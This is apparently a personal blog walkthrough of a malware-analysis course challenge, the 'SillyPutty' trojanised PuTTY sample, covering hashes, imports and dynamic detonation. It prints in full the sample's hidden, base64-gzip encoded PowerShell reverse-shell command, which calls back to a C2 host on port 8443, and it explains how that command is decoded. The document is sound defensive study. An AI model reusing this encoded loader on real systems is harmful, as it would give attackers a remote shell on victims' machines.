---
title: "2024-09-19-reverse-engineering-challenge-1"
date: 2024-09-19
---

# Challenge 1: SillyPutty Walkthrough
This is the first challenge of the course from TCM Academy called "Practical Malware Analysis & Triage".

## Challenge Questions:

### Basic Static Analysis
---

- What is the SHA256 hash of the sample? \
    **R=** 0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83  \
    ![image](https://github.com/user-attachments/assets/079f6aa2-3ec8-4426-99ba-ecbe80433cf3)

- What architecture is this binary? \
    **R=** Using PEstudio, we can confirm it is a 32-bit binary. \
    ![image](https://github.com/user-attachments/assets/bd791d76-1933-459c-8b42-a33953b9a036)

- Are there any results from submitting the SHA256 hash to VirusTotal?
  
    **R=** Yes, it is widely detected by anti-virus engines. It's interesting that it is detected as "meterpreter" from the "Threat Label". We now know in advanced that most likely this is the payload from metasploit.
    ![image](https://github.com/user-attachments/assets/e258c7da-7749-46e3-89c9-9561178e7fe9)

- Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?

    **R=** No interesting strings
- Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?
  
    **R=** Checks for the presence of debuggers with function _IsDebuggerPresent_ \
    ![image](https://github.com/user-attachments/assets/8bce722b-30c7-4034-849b-64108afcf7a0)

- Is it likely that this binary is packed?

    **R=** No, way too many visible ASCII strings for the binary to be packed
### Basic Dynamic Analysis
 - Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?
   
    **R=** Without internet simulation, what looks to be a powershell windows shows up briefly, and then the common "putty" window pops-up.
          ![image](https://github.com/user-attachments/assets/b79f2e1c-f427-4163-b9cd-ecde13320287)

   With internet simulation, a powershell windows stays open for a few seconds, then it dissapears. At the end, we are left with the same well-known "putty" window.
   
 - From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?

    **R=** Having procmon turned on beforehand, with a filter to only get the activity performed by the process `putty.exe`, we were able to track it's activity and from there pivot over to its process tree; where we were able to get the command executed by the powershell windows we saw in the initial detonation.
   ``` 
    powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
   ```
   ![image](https://github.com/user-attachments/assets/76d3ef0e-8502-4ac3-a55a-c78dfff866a5)


 - What is the DNS record that is queried at detonation?

    **R=** bonus2[.]corporatebonusapplication[.]local
   ![image](https://github.com/user-attachments/assets/8b44d811-8784-48e6-a08d-1180c3a3e102)

 - What is the callback port number at detonation?

   **R=** 8443

   In order to answer this question, I needed to figure how to get the main payload (base64 string) into ASCII.Looking into each of the    functions that it is performing it performs the following:
   1. Decodes the string from base64
   2. Stores decoded output into memory
   3. Decompresses from gzip compression
   4. Reads code from memory
   5. Executes the code

   I figured that I might be able to decode this using [CyberChef](https://gchq.github.io/CyberChef/),following the same process, I decoded the string using the "From Base64" CyberChef function, and then the "Gunzip" to decompress the data with gzip headers, then I was able to take a peek at the plain-text code.
   
     ![image](https://github.com/user-attachments/assets/cbca011a-ff40-41cf-ae84-38ab384f5302)

   The first line caught my eye, as it seems that the Threat Actor has used a very likely open source red team tool. Doing a little of google-fu, the authors presented a [conference talk](https://youtu.be/ottfZFRSsj4?t=1467) in 2015 talking about this tool, which basically allows to run an interactive powershell session in the victim host through metasploit.

   ![image](https://github.com/user-attachments/assets/dc7f8b77-61ed-4251-b1cb-d6c7b0744d87)





 - What is the callback protocol at detonation?

   **R=** TCP

   ![image](https://github.com/user-attachments/assets/e31eeef7-a430-4467-94cd-100445918011)

 - How can you use host-based telemetry to identify the DNS record, port, and protocol?
 - Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?
